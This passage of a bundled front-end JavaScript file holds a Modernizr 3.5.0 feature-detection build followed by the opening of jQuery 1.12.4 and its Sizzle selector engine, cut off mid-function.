/*! modernizr 3.5.0 (Custom Build) | MIT *
 * https://modernizr.com/download/?-cssanimations-csscolumns-customelements-flexbox-history-picture-pointerevents-postmessage-sizes-srcset-webgl-websockets-webworkers-addtest-domprefixes-hasevent-mq-prefixedcssvalue-prefixes-setclasses-testallprops-testprop-teststyles !*/
!(function (t, e, n) {
  function i(t, e) {
    return typeof t === e;
  }
  function o(t) {
    var e = w.className,
      n = b._config.classPrefix || "";
    if ((x && (e = e.baseVal), b._config.enableJSClass)) {
      var i = new RegExp("(^|\\s)" + n + "no-js(\\s|$)");
      e = e.replace(i, "$1" + n + "js$2");
    }
    b._config.enableClasses &&
      ((e += " " + n + t.join(" " + n)),
      x ? (w.className.baseVal = e) : (w.className = e));
  }
  function r(t, e) {
    if ("object" == typeof t) for (var n in t) C(t, n) && r(n, t[n]);
    else {
      var i = (t = t.toLowerCase()).split("."),
        s = b[i[0]];
      if ((2 == i.length && (s = s[i[1]]), void 0 !== s)) return b;
      (e = "function" == typeof e ? e() : e),
        1 == i.length
          ? (b[i[0]] = e)
          : (!b[i[0]] ||
              b[i[0]] instanceof Boolean ||
              (b[i[0]] = new Boolean(b[i[0]])),
            (b[i[0]][i[1]] = e)),
        o([(e && 0 != e ? "" : "no-") + i.join("-")]),
        b._trigger(t, e);
    }
    return b;
  }
  function s() {
    return "function" != typeof e.createElement
      ? e.createElement(arguments[0])
      : x
      ? e.createElementNS.call(e, "http://www.w3.org/2000/svg", arguments[0])
      : e.createElement.apply(e, arguments);
  }
  function a(t, n, i, o) {
    var r,
      a,
      l,
      c,
      u = "modernizr",
      d = s("div"),
      h = (function () {
        var t = e.body;
        return t || ((t = s(x ? "svg" : "body")).fake = !0), t;
      })();
    if (parseInt(i, 10))
      for (; i--; )
        ((l = s("div")).id = o ? o[i] : u + (i + 1)), d.appendChild(l);
    return (
      ((r = s("style")).type = "text/css"),
      (r.id = "s" + u),
      (h.fake ? h : d).appendChild(r),
      h.appendChild(d),
      r.styleSheet
        ? (r.styleSheet.cssText = t)
        : r.appendChild(e.createTextNode(t)),
      (d.id = u),
      h.fake &&
        ((h.style.background = ""),
        (h.style.overflow = "hidden"),
        (c = w.style.overflow),
        (w.style.overflow = "hidden"),
        w.appendChild(h)),
      (a = n(d, t)),
      h.fake
        ? (h.parentNode.removeChild(h), (w.style.overflow = c), w.offsetHeight)
        : d.parentNode.removeChild(d),
      !!a
    );
  }
  function l(t, e) {
    return !!~("" + t).indexOf(e);
  }
  function c(t) {
    return t
      .replace(/([A-Z])/g, function (t, e) {
        return "-" + e.toLowerCase();
      })
      .replace(/^ms-/, "-ms-");
  }
  function u(e, n, i) {
    var o;
    if ("getComputedStyle" in t) {
      o = getComputedStyle.call(t, e, n);
      var r = t.console;
      if (null !== o) i && (o = o.getPropertyValue(i));
      else if (r) {
        r[r.error ? "error" : "log"].call(
          r,
          "getComputedStyle returning null, its possible modernizr test results are inaccurate"
        );
      }
    } else o = !n && e.currentStyle && e.currentStyle[i];
    return o;
  }
  function d(e, i) {
    var o = e.length;
    if ("CSS" in t && "supports" in t.CSS) {
      for (; o--; ) if (t.CSS.supports(c(e[o]), i)) return !0;
      return !1;
    }
    if ("CSSSupportsRule" in t) {
      for (var r = []; o--; ) r.push("(" + c(e[o]) + ":" + i + ")");
      return a(
        "@supports (" +
          (r = r.join(" or ")) +
          ") { #modernizr { position: absolute; } }",
        function (t) {
          return "absolute" == u(t, null, "position");
        }
      );
    }
    return n;
  }
  function h(t) {
    return t
      .replace(/([a-z])-([a-z])/g, function (t, e, n) {
        return e + n.toUpperCase();
      })
      .replace(/^-/, "");
  }
  function f(t, e, o, r) {
    function a() {
      u && (delete N.style, delete N.modElem);
    }
    if (((r = !i(r, "undefined") && r), !i(o, "undefined"))) {
      var c = d(t, o);
      if (!i(c, "undefined")) return c;
    }
    for (
      var u, f, p, g, m, v = ["modernizr", "tspan", "samp"];
      !N.style && v.length;

    )
      (u = !0), (N.modElem = s(v.shift())), (N.style = N.modElem.style);
    for (p = t.length, f = 0; p > f; f++)
      if (
        ((g = t[f]),
        (m = N.style[g]),
        l(g, "-") && (g = h(g)),
        N.style[g] !== n)
      ) {
        if (r || i(o, "undefined")) return a(), "pfx" != e || g;
        try {
          N.style[g] = o;
        } catch (t) {}
        if (N.style[g] != m) return a(), "pfx" != e || g;
      }
    return a(), !1;
  }
  function p(t, e) {
    return function () {
      return t.apply(e, arguments);
    };
  }
  function g(t, e, n, o, r) {
    var s = t.charAt(0).toUpperCase() + t.slice(1),
      a = (t + " " + L.join(s + " ") + s).split(" ");
    return i(e, "string") || i(e, "undefined")
      ? f(a, e, o, r)
      : (function (t, e, n) {
          var o;
          for (var r in t)
            if (t[r] in e)
              return !1 === n
                ? t[r]
                : i((o = e[t[r]]), "function")
                ? p(o, n || e)
                : o;
          return !1;
        })((a = (t + " " + T.join(s + " ") + s).split(" ")), e, n);
  }
  function m(t, e, i) {
    return g(t, n, n, e, i);
  }
  var v = [],
    y = {
      _version: "3.5.0",
      _config: {
        classPrefix: "",
        enableClasses: !0,
        enableJSClass: !0,
        usePrefixes: !0,
      },
      _q: [],
      on: function (t, e) {
        var n = this;
        setTimeout(function () {
          e(n[t]);
        }, 0);
      },
      addTest: function (t, e, n) {
        v.push({ name: t, fn: e, options: n });
      },
      addAsyncTest: function (t) {
        v.push({ name: null, fn: t });
      },
    },
    b = function () {};
  (b.prototype = y), (b = new b());
  var _ = [],
    w = e.documentElement,
    x = "svg" === w.nodeName.toLowerCase(),
    E = "Moz O ms Webkit",
    T = y._config.usePrefixes ? E.toLowerCase().split(" ") : [];
  y._domPrefixes = T;
  var C,
    A = y._config.usePrefixes
      ? " -webkit- -moz- -o- -ms- ".split(" ")
      : ["", ""];
  (y._prefixes = A),
    (function () {
      var t = {}.hasOwnProperty;
      C =
        i(t, "undefined") || i(t.call, "undefined")
          ? function (t, e) {
              return e in t && i(t.constructor.prototype[e], "undefined");
            }
          : function (e, n) {
              return t.call(e, n);
            };
    })(),
    (y._l = {}),
    (y.on = function (t, e) {
      this._l[t] || (this._l[t] = []),
        this._l[t].push(e),
        b.hasOwnProperty(t) &&
          setTimeout(function () {
            b._trigger(t, b[t]);
          }, 0);
    }),
    (y._trigger = function (t, e) {
      if (this._l[t]) {
        var n = this._l[t];
        setTimeout(function () {
          var t;
          for (t = 0; t < n.length; t++) (0, n[t])(e);
        }, 0),
          delete this._l[t];
      }
    }),
    b._q.push(function () {
      y.addTest = r;
    });
  var k = (function () {
    var t = !("onblur" in e.documentElement);
    return function (e, i) {
      var o;
      return (
        !!e &&
        ((i && "string" != typeof i) || (i = s(i || "div")),
        !(o = (e = "on" + e) in i) &&
          t &&
          (i.setAttribute || (i = s("div")),
          i.setAttribute(e, ""),
          (o = "function" == typeof i[e]),
          i[e] !== n && (i[e] = n),
          i.removeAttribute(e)),
        o)
      );
    };
  })();
  y.hasEvent = k;
  var S = (function () {
    var e = t.matchMedia || t.msMatchMedia;
    return e
      ? function (t) {
          var n = e(t);
          return (n && n.matches) || !1;
        }
      : function (e) {
          var n = !1;
          return (
            a(
              "@media " + e + " { #modernizr { position: absolute; } }",
              function (e) {
                n =
                  "absolute" ==
                  (t.getComputedStyle
                    ? t.getComputedStyle(e, null)
                    : e.currentStyle
                  ).position;
              }
            ),
            n
          );
        };
  })();
  y.mq = S;
  y.prefixedCSSValue = function (t, e) {
    var n = !1,
      i = s("div").style;
    if (t in i) {
      var o = T.length;
      for (i[t] = e, n = i[t]; o-- && !n; )
        (i[t] = "-" + T[o] + "-" + e), (n = i[t]);
    }
    return "" === n && (n = !1), n;
  };
  var L = y._config.usePrefixes ? E.split(" ") : [];
  y._cssomPrefixes = L;
  var D = { elem: s("modernizr") };
  b._q.push(function () {
    delete D.elem;
  });
  var N = { style: D.elem.style };
  b._q.unshift(function () {
    delete N.style;
  }),
    (y.testAllProps = g),
    (y.testAllProps = m),
    (y.testProp = function (t, e, i) {
      return f([t], n, e, i);
    }),
    (y.testStyles = a),
    b.addTest("customelements", "customElements" in t),
    b.addTest("history", function () {
      var e = navigator.userAgent;
      return (
        ((-1 === e.indexOf("Android 2.") && -1 === e.indexOf("Android 4.0")) ||
          -1 === e.indexOf("Mobile Safari") ||
          -1 !== e.indexOf("Chrome") ||
          -1 !== e.indexOf("Windows Phone") ||
          "file:" === location.protocol) &&
        t.history &&
        "pushState" in t.history
      );
    }),
    b.addTest("pointerevents", function () {
      var t = !1,
        e = T.length;
      for (t = b.hasEvent("pointerdown"); e-- && !t; )
        k(T[e] + "pointerdown") && (t = !0);
      return t;
    }),
    b.addTest("postmessage", "postMessage" in t),
    b.addTest("webgl", function () {
      var e = s("canvas"),
        n =
          "probablySupportsContext" in e
            ? "probablySupportsContext"
            : "supportsContext";
      return n in e
        ? e[n]("webgl") || e[n]("experimental-webgl")
        : "WebGLRenderingContext" in t;
    });
  var O = !1;
  try {
    O = "WebSocket" in t && 2 === t.WebSocket.CLOSING;
  } catch (t) {}
  b.addTest("websockets", O),
    b.addTest("cssanimations", m("animationName", "a", !0)),
    (function () {
      b.addTest("csscolumns", function () {
        var t = !1,
          e = m("columnCount");
        try {
          (t = !!e) && (t = new Boolean(t));
        } catch (t) {}
        return t;
      });
      for (
        var t,
          e,
          n = [
            "Width",
            "Span",
            "Fill",
            "Gap",
            "Rule",
            "RuleColor",
            "RuleStyle",
            "RuleWidth",
            "BreakBefore",
            "BreakAfter",
            "BreakInside",
          ],
          i = 0;
        i < n.length;
        i++
      )
        (t = n[i].toLowerCase()),
          (e = m("column" + n[i])),
          ("breakbefore" === t || "breakafter" === t || "breakinside" == t) &&
            (e = e || m(n[i])),
          b.addTest("csscolumns." + t, e);
    })(),
    b.addTest("flexbox", m("flexBasis", "1px", !0)),
    b.addTest("picture", "HTMLPictureElement" in t),
    b.addAsyncTest(function () {
      var t,
        e,
        n = s("img"),
        i = "sizes" in n;
      !i && "srcset" in n
        ? ("data:image/gif;base64,R0lGODlhAgABAPAAAP///wAAACH5BAAAAAAALAAAAAACAAEAAAICBAoAOw==",
          (t =
            "data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="),
          (e = function () {
            r("sizes", 2 == n.width);
          }),
          (n.onload = e),
          (n.onerror = e),
          n.setAttribute("sizes", "9px"),
          (n.srcset =
            t +
            " 1w,data:image/gif;base64,R0lGODlhAgABAPAAAP///wAAACH5BAAAAAAALAAAAAACAAEAAAICBAoAOw== 8w"),
          (n.src = t))
        : r("sizes", i);
    }),
    b.addTest("srcset", "srcset" in s("img")),
    b.addTest("webworkers", "Worker" in t),
    (function () {
      var t, e, n, o, r, s;
      for (var a in v)
        if (v.hasOwnProperty(a)) {
          if (
            ((t = []),
            (e = v[a]).name &&
              (t.push(e.name.toLowerCase()),
              e.options && e.options.aliases && e.options.aliases.length))
          )
            for (n = 0; n < e.options.aliases.length; n++)
              t.push(e.options.aliases[n].toLowerCase());
          for (
            o = i(e.fn, "function") ? e.fn() : e.fn, r = 0;
            r < t.length;
            r++
          )
            1 === (s = t[r].split(".")).length
              ? (b[s[0]] = o)
              : (!b[s[0]] ||
                  b[s[0]] instanceof Boolean ||
                  (b[s[0]] = new Boolean(b[s[0]])),
                (b[s[0]][s[1]] = o)),
              _.push((o ? "" : "no-") + s.join("-"));
        }
    })(),
    o(_),
    delete y.addTest,
    delete y.addAsyncTest;
  for (var j = 0; j < b._q.length; j++) b._q[j]();
  t.Modernizr = b;
})(window, document),
  (function (t, e) {
    "object" == typeof module && "object" == typeof module.exports
      ? (module.exports = t.document
          ? e(t, !0)
          : function (t) {
              if (!t.document)
                throw new Error("jQuery requires a window with a document");
              return e(t);
            })
      : e(t);
  })("undefined" != typeof window ? window : this, function (t, e) {
    var n = [],
      i = t.document,
      o = n.slice,
      r = n.concat,
      s = n.push,
      a = n.indexOf,
      l = {},
      c = l.toString,
      u = l.hasOwnProperty,
      d = {},
      h = "1.12.4",
      f = function (t, e) {
        return new f.fn.init(t, e);
      },
      p = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,
      g = /^-ms-/,
      m = /-([\da-z])/gi,
      v = function (t, e) {
        return e.toUpperCase();
      };
    function y(t) {
      var e = !!t && "length" in t && t.length,
        n = f.type(t);
      return (
        "function" !== n &&
        !f.isWindow(t) &&
        ("array" === n ||
          0 === e ||
          ("number" == typeof e && e > 0 && e - 1 in t))
      );
    }
    (f.fn = f.prototype =
      {
        jquery: h,
        constructor: f,
        selector: "",
        length: 0,
        toArray: function () {
          return o.call(this);
        },
        get: function (t) {
          return null != t
            ? 0 > t
              ? this[t + this.length]
              : this[t]
            : o.call(this);
        },
        pushStack: function (t) {
          var e = f.merge(this.constructor(), t);
          return (e.prevObject = this), (e.context = this.context), e;
        },
        each: function (t) {
          return f.each(this, t);
        },
        map: function (t) {
          return this.pushStack(
            f.map(this, function (e, n) {
              return t.call(e, n, e);
            })
          );
        },
        slice: function () {
          return this.pushStack(o.apply(this, arguments));
        },
        first: function () {
          return this.eq(0);
        },
        last: function () {
          return this.eq(-1);
        },
        eq: function (t) {
          var e = this.length,
            n = +t + (0 > t ? e : 0);
          return this.pushStack(n >= 0 && e > n ? [this[n]] : []);
        },
        end: function () {
          return this.prevObject || this.constructor();
        },
        push: s,
        sort: n.sort,
        splice: n.splice,
      }),
      (f.extend = f.fn.extend =
        function () {
          var t,
            e,
            n,
            i,
            o,
            r,
            s = arguments[0] || {},
            a = 1,
            l = arguments.length,
            c = !1;
          for (
            "boolean" == typeof s && ((c = s), (s = arguments[a] || {}), a++),
              "object" == typeof s || f.isFunction(s) || (s = {}),
              a === l && ((s = this), a--);
            l > a;
            a++
          )
            if (null != (o = arguments[a]))
              for (i in o)
                (t = s[i]),
                  s !== (n = o[i]) &&
                    (c && n && (f.isPlainObject(n) || (e = f.isArray(n)))
                      ? (e
                          ? ((e = !1), (r = t && f.isArray(t) ? t : []))
                          : (r = t && f.isPlainObject(t) ? t : {}),
                        (s[i] = f.extend(c, r, n)))
                      : void 0 !== n && (s[i] = n));
          return s;
        }),
      f.extend({
        expando: "jQuery" + (h + Math.random()).replace(/\D/g, ""),
        isReady: !0,
        error: function (t) {
          throw new Error(t);
        },
        noop: function () {},
        isFunction: function (t) {
          return "function" === f.type(t);
        },
        isArray:
          Array.isArray ||
          function (t) {
            return "array" === f.type(t);
          },
        isWindow: function (t) {
          return null != t && t == t.window;
        },
        isNumeric: function (t) {
          var e = t && t.toString();
          return !f.isArray(t) && e - parseFloat(e) + 1 >= 0;
        },
        isEmptyObject: function (t) {
          var e;
          for (e in t) return !1;
          return !0;
        },
        isPlainObject: function (t) {
          var e;
          if (!t || "object" !== f.type(t) || t.nodeType || f.isWindow(t))
            return !1;
          try {
            if (
              t.constructor &&
              !u.call(t, "constructor") &&
              !u.call(t.constructor.prototype, "isPrototypeOf")
            )
              return !1;
          } catch (t) {
            return !1;
          }
          if (!d.ownFirst) for (e in t) return u.call(t, e);
          for (e in t);
          return void 0 === e || u.call(t, e);
        },
        type: function (t) {
          return null == t
            ? t + ""
            : "object" == typeof t || "function" == typeof t
            ? l[c.call(t)] || "object"
            : typeof t;
        },
        globalEval: function (e) {
          e &&
            f.trim(e) &&
            (
              t.execScript ||
              function (e) {
                t.eval.call(t, e);
              }
            )(e);
        },
        camelCase: function (t) {
          return t.replace(g, "ms-").replace(m, v);
        },
        nodeName: function (t, e) {
          return t.nodeName && t.nodeName.toLowerCase() === e.toLowerCase();
        },
        each: function (t, e) {
          var n,
            i = 0;
          if (y(t))
            for (n = t.length; n > i && !1 !== e.call(t[i], i, t[i]); i++);
          else for (i in t) if (!1 === e.call(t[i], i, t[i])) break;
          return t;
        },
        trim: function (t) {
          return null == t ? "" : (t + "").replace(p, "");
        },
        makeArray: function (t, e) {
          var n = e || [];
          return (
            null != t &&
              (y(Object(t))
                ? f.merge(n, "string" == typeof t ? [t] : t)
                : s.call(n, t)),
            n
          );
        },
        inArray: function (t, e, n) {
          var i;
          if (e) {
            if (a) return a.call(e, t, n);
            for (
              i = e.length, n = n ? (0 > n ? Math.max(0, i + n) : n) : 0;
              i > n;
              n++
            )
              if (n in e && e[n] === t) return n;
          }
          return -1;
        },
        merge: function (t, e) {
          for (var n = +e.length, i = 0, o = t.length; n > i; ) t[o++] = e[i++];
          if (n != n) for (; void 0 !== e[i]; ) t[o++] = e[i++];
          return (t.length = o), t;
        },
        grep: function (t, e, n) {
          for (var i = [], o = 0, r = t.length, s = !n; r > o; o++)
            !e(t[o], o) !== s && i.push(t[o]);
          return i;
        },
        map: function (t, e, n) {
          var i,
            o,
            s = 0,
            a = [];
          if (y(t))
            for (i = t.length; i > s; s++)
              null != (o = e(t[s], s, n)) && a.push(o);
          else for (s in t) null != (o = e(t[s], s, n)) && a.push(o);
          return r.apply([], a);
        },
        guid: 1,
        proxy: function (t, e) {
          var n, i, r;
          return (
            "string" == typeof e && ((r = t[e]), (e = t), (t = r)),
            f.isFunction(t)
              ? ((n = o.call(arguments, 2)),
                ((i = function () {
                  return t.apply(e || this, n.concat(o.call(arguments)));
                }).guid = t.guid =
                  t.guid || f.guid++),
                i)
              : void 0
          );
        },
        now: function () {
          return +new Date();
        },
        support: d,
      }),
      "function" == typeof Symbol &&
        (f.fn[Symbol.iterator] = n[Symbol.iterator]),
      f.each(
        "Boolean Number String Function Array Date RegExp Object Error Symbol".split(
          " "
        ),
        function (t, e) {
          l["[object " + e + "]"] = e.toLowerCase();
        }
      );
    var b = (function (t) {
      var e,
        n,
        i,
        o,
        r,
        s,
        a,
        l,
        c,
        u,
        d,
        h,
        f,
        p,
        g,
        m,
        v,
        y,
        b,
        _ = "sizzle" + 1 * new Date(),
        w = t.document,
        x = 0,
        E = 0,
        T = rt(),
        C = rt(),
        A = rt(),
        k = function (t, e) {
          return t === e && (d = !0), 0;
        },
        S = 1 << 31,
        L = {}.hasOwnProperty,
        D = [],
        N = D.pop,
        O = D.push,
        j = D.push,
        P = D.slice,
        H = function (t, e) {
          for (var n = 0, i = t.length; i > n; n++) if (t[n] === e) return n;
          return -1;
        },
        M =
          "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
        z = "[\\x20\\t\\r\\n\\f]",
        B = "(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",
        I =
          "\\[" +
          z +
          "*(" +
          B +
          ")(?:" +
          z +
          "*([*^$|!~]?=)" +
          z +
          "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" +
          B +
          "))|)" +
          z +
          "*\\]",
        $ =
          ":(" +
          B +
          ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" +
          I +
          ")*)|.*)\\)|)",
        R = new RegExp(z + "+", "g"),
        W = new RegExp("^" + z + "+|((?:^|[^\\\\])(?:\\\\.)*)" + z + "+$", "g"),
        q = new RegExp("^" + z + "*," + z + "*"),
        F = new RegExp("^" + z + "*([>+~]|" + z + ")" + z + "*"),
        U = new RegExp("=" + z + "*([^\\]'\"]*?)" + z + "*\\]", "g"),
        X = new RegExp($),
        V = new RegExp("^" + B + "$"),
        Y = {
          ID: new RegExp("^#(" + B + ")"),
          CLASS: new RegExp("^\\.(" + B + ")"),
          TAG: new RegExp("^(" + B + "|[*])"),
          ATTR: new RegExp("^" + I),
          PSEUDO: new RegExp("^" + $),
          CHILD: new RegExp(
            "^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" +
              z +
              "*(even|odd|(([+-]|)(\\d*)n|)" +
              z +
              "*(?:([+-]|)" +
              z +
              "*(\\d+)|))" +
              z +
              "*\\)|)",
            "i"
          ),
          bool: new RegExp("^(?:" + M + ")$", "i"),
          needsContext: new RegExp(
            "^" +
              z +
              "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" +
              z +
              "*((?:-\\d)?\\d*)" +
              z +
              "*\\)|)(?=[^-]|$)",
            "i"
          ),
        },
        K = /^(?:input|select|textarea|button)$/i,
        Q = /^h\d$/i,
        G = /^[^{]+\{\s*\[native \w/,
        Z = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
        J = /[+~]/,
        tt = /'|\\/g,
        et = new RegExp("\\\\([\\da-f]{1,6}" + z + "?|(" + z + ")|.)", "ig"),
        nt = function (t, e, n) {
          var i = "0x" + e - 65536;
          return i != i || n
            ? e
            : 0 > i
            ? String.fromCharCode(i + 65536)
            : String.fromCharCode((i >> 10) | 55296, (1023 & i) | 56320);
        },
        it = function () {
          h();
        };
      try {
        j.apply((D = P.call(w.childNodes)), w.childNodes),
          D[w.childNodes.length].nodeType;
      } catch (t) {
        j = {
          apply: D.length
            ? function (t, e) {
                O.apply(t, P.call(e));
              }
            : function (t, e) {
                for (var n = t.length, i = 0; (t[n++] = e[i++]); );
                t.length = n - 1;
              },
        };
      }
      function ot(t, e, i, o) {
        var r,
          a,
          c,
          u,
          d,
          p,
          v,
          y,
          x = e && e.ownerDocument,
          E = e ? e.nodeType : 9;
        if (
          ((i = i || []),
          "string" != typeof t || !t || (1 !== E && 9 !== E && 11 !== E))
        )
          return i;
        if (
          !o &&
          ((e ? e.ownerDocument || e : w) !== f && h(e), (e = e || f), g)
        ) {
          if (11 !== E && (p = Z.exec(t)))
            if ((r = p[1])) {
              if (9 === E) {
                if (!(c = e.getElementById(r))) return i;
                if (c.id === r) return i.push(c), i;
              } else if (
                x &&
                (c = x.getElementById(r)) &&
                b(e, c) &&
                c.id === r
              )
                return i.push(c), i;
            } else {
              if (p[2]) return j.apply(i, e.getElementsByTagName(t)), i;
              if (
                (r = p[3]) &&
                n.getElementsByClassName &&
                e.getElementsByClassName
              )
                return j.apply(i, e.getElementsByClassName(r)), i;
            }
          if (n.qsa && !A[t + " "] && (!m || !m.test(t))) {
            if (1 !== E) (x = e), (y = t);
            else if ("object" !== e.nodeName.toLowerCase()) {
              for (
                (u = e.getAttribute("id"))
                  ? (u = u.replace(tt, "\\$&"))
                  : e.setAttribute("id", (u = _)),
                  a = (v = s(t)).length,
                  d = V.test(u) ? "#" + u : "[id='" + u + "']";
                a--;

              )
                v[a] = d + " " + gt(v[a]);
              (y = v.join(",")), (x = (J.test(t) && ft(e.parentNode)) || e);
            }
            if (y)
              try {
                return j.apply(i, x.querySelectorAll(y)), i;
              } catch (t) {
              } finally {
                u === _ && e.removeAttribute("id");
              }
          }
        }
        return l(t.replace(W, "$1"), e, i, o);
      }
      function rt() {
        var t = [];
        return function e(n, o) {
          return (
            t.push(n + " ") > i.cacheLength && delete e[t.shift()],
            (e[n + " "] = o)
          );
        };
      }
      function st(t) {
        return (t[_] = !0), t;
      }
      function at(t) {
        var e = f.createElement("div");
        try {
          return !!t(e);
        } catch (t) {
          return !1;
        } finally {
          e.parentNode && e.parentNode.removeChild(e), (e = null);
        }
      }
      function lt(t, e) {
        for (var n = t.split("|"), o = n.length; o--; ) i.attrHandle[n[o]] = e;
      }
      function ct(t, e) {
        var n = e && t,
          i =
            n &&
            1 === t.nodeType &&
            1 === e.nodeType &&
            (~e.sourceIndex || S) - (~t.sourceIndex || S);
        if (i) return i;
        if (n) for (; (n = n.nextSibling); ) if (n === e) return -1;
        return t ? 1 : -1;
      }
      function ut(t) {
        return function (e) {
          return "input" === e.nodeName.toLowerCase() && e.type === t;
        };
      }
      function dt(t) {
        return function (e) {
          var n = e.nodeName.toLowerCase();
          return ("input" === n || "button" === n) && e.type === t;
        };
      }
      function ht(t) {
        return st(function (e) {
          return (
            (e = +e),
            st(function (n, i) {
              for (var o, r = t([], n.length, e), s = r.length; s--; )
                n[(o = r[s])] && (n[o] = !(i[o] = n[o]));
            })
          );
        });
      }
      function ft(t) {
        return t && void 0 !== t.getElementsByTagName && t;
      }
      for (e in ((n = ot.support = {}),
      (r = ot.isXML =
        function (t) {
          var e = t && (t.ownerDocument || t).documentElement;
          return !!e && "HTML" !== e.nodeName;
        }),
      (h = ot.setDocument =
        function (t) {
          var e,
            o,
            s = t ? t.ownerDocument || t : w;
          return s !== f && 9 === s.nodeType && s.documentElement
            ? ((p = (f = s).documentElement),
              (g = !r(f)),
              (o = f.defaultView) &&
                o.top !== o &&
                (o.addEventListener
                  ? o.addEventListener("unload", it, !1)
                  : o.attachEvent && o.attachEvent("onunload", it)),
              (n.attributes = at(function (t) {
                return (t.className = "i"), !t.getAttribute("className");
              })),
              (n.getElementsByTagName = at(function (t) {
                return (
                  t.appendChild(f.createComment("")),
                  !t.getElementsByTagName("*").length
                );
              })),
              (n.getElementsByClassName = G.test(f.getElementsByClassName)),
              (n.getById = at(function (t) {
                return (
                  (p.appendChild(t).id = _),
                  !f.getElementsByName || !f.getElementsByName(_).length
                );
              })),
              n.getById
                ? ((i.find.ID = function (t, e) {
                    if (void 0 !== e.getElementById && g) {
                      var n = e.getElementById(t);
                      return n ? [n] : [];
                    }
                  }),
                  (i.filter.ID = function (t) {
                    var e = t.replace(et, nt);
                    return function (t) {
                      return t.getAttribute("id") === e;
                    };
                  }))
                : (delete i.find.ID,
                  (i.filter.ID = function (t) {
                    var e = t.replace(et, nt);
                    return function (t) {
                      var n =
                        void 0 !== t.getAttributeNode &&
                        t.getAttributeNode("id");
                      return n && n.value === e;
                    };
                  })),
              (i.find.TAG = n.getElementsByTagName
                ? function (t, e) {
                    return void 0 !== e.getElementsByTagName
                      ? e.getElementsByTagName(t)
                      : n.qsa
                      ? e.querySelectorAll(t)
                      : void 0;
                  }
                : function (t, e) {
                    var n,
                      i = [],
                      o = 0,
                      r = e.getElementsByTagName(t);
                    if ("*" === t) {
                      for (; (n = r[o++]); ) 1 === n.nodeType && i.push(n);
                      return i;
                    }
                    return r;
                  }),
              (i.find.CLASS =
                n.getElementsByClassName &&
                function (t, e) {
                  return void 0 !== e.getElementsByClassName && g
                    ? e.getElementsByClassName(t)
                    : void 0;
                }),
              (v = []),
              (m = []),
              (n.qsa = G.test(f.querySelectorAll)) &&
                (at(function (t) {
                  (p.appendChild(t).innerHTML =
                    "<a id='" +
                    _ +
                    "'></a><select id='" +
                    _ +
                    "-\r\\' msallowcapture=''><option selected=''></option></select>"),
                    t.querySelectorAll("[msallowcapture^='']").length &&
                      m.push("[*^$]=" + z + "*(?:''|\"\")"),
                    t.querySelectorAll("[selected]").length ||
                      m.push("\\[" + z + "*(?:value|" + M + ")"),
                    t.querySelectorAll("[id~=" + _ + "-]").length ||
                      m.push("~="),
                    t.querySelectorAll(":checked").length || m.push(":checked"),
                    t.querySelectorAll("a#" + _ + "+*").length ||
                      m.push(".#.+[+~]");
                }),
                at(function (t) {
                  var e = f.createElement("input");
                  e.setAttribute("type", "hidden"),
                    t.appendChild(e).setAttribute("name", "D"),
                    t.querySelectorAll("[name=d]").length &&
                      m.push("name" + z + "*[*^$|!~]?="),
                    t.querySelectorAll(":enabled").length ||
                      m.push(":enabled", ":disabled"),
                    t.querySelectorAll("*,:x"),
                    m.push(",.*:");
                })),
              (n.matchesSelector = G.test(
                (y =
                  p.matches ||
                  p.webkitMatchesSelector ||
                  p.mozMatchesSelector ||
                  p.oMatchesSelector ||
                  p.msMatchesSelector)
              )) &&
                at(function (t) {
                  (n.disconnectedMatch = y.call(t, "div")),
                    y.call(t, "[s!='']:x"),
                    v.push("!=", $);
                }),
              (m = m.length && new RegExp(m.join("|"))),
              (v = v.length && new RegExp(v.join("|"))),
              (e = G.test(p.compareDocumentPosition)),
              (b =
                e || G.test(p.contains)
                  ? function (t, e) {
                      var n = 9 === t.nodeType ? t.documentElement : t,
                        i = e && e.parentNode;
                      return (
                        t === i ||
                        !(
                          !i ||
                          1 !== i.nodeType ||
                          !(n.contains
                            ? n.contains(i)
                            : t.compareDocumentPosition &&
                              16 & t.compareDocumentPosition(i))
                        )
                      );
                    }
                  : function (t, e) {
                      if (e)
                        for (; (e = e.parentNode); ) if (e === t) return !0;
                      return !1;
                    }),
              (k = e
                ? function (t, e) {
                    if (t === e) return (d = !0), 0;
                    var i =
                      !t.compareDocumentPosition - !e.compareDocumentPosition;
                    return (
                      i ||
                      (1 &
                        (i =
                          (t.ownerDocument || t) === (e.ownerDocument || e)
                            ? t.compareDocumentPosition(e)
                            : 1) ||
                      (!n.sortDetached && e.compareDocumentPosition(t) === i)
                        ? t === f || (t.ownerDocument === w && b(w, t))
                          ? -1
                          : e === f || (e.ownerDocument === w && b(w, e))
                          ? 1
                          : u
                          ? H(u, t) - H(u, e)
                          : 0
                        : 4 & i
                        ? -1
                        : 1)
                    );
                  }
                : function (t, e) {
                    if (t === e) return (d = !0), 0;
                    var n,
                      i = 0,
                      o = t.parentNode,
                      r = e.parentNode,
                      s = [t],
                      a = [e];
                    if (!o || !r)
                      return t === f
                        ? -1
                        : e === f
                        ? 1
                        : o
                        ? -1
                        : r
                        ? 1
                        : u
                        ? H(u, t) - H(u, e)
                        : 0;
                    if (o === r) return ct(t, e);
                    for (n = t; (n = n.parentNode); ) s.unshift(n);
                    for (n = e; (n = n.parentNode); ) a.unshift(n);
                    for (; s[i] === a[i]; ) i++;
                    return i
                      ? ct(s[i], a[i])
                      : s[i] === w
                      ? -1
                      : a[i] === w
                      ? 1
                      : 0;
                  }),
              f)
            : f;
        }),
      (ot.matches = function (t, e) {
        return ot(t, null, null, e);
      }),
      (ot.matchesSelector = function (t, e) {
        if (
          ((t.ownerDocument || t) !== f && h(t),
          (e = e.replace(U, "='$1']")),
          n.matchesSelector &&
            g &&
            !A[e + " "] &&
            (!v || !v.test(e)) &&
            (!m || !m.test(e)))
        )
          try {
            var i = y.call(t, e);
            if (
              i ||
              n.disconnectedMatch ||
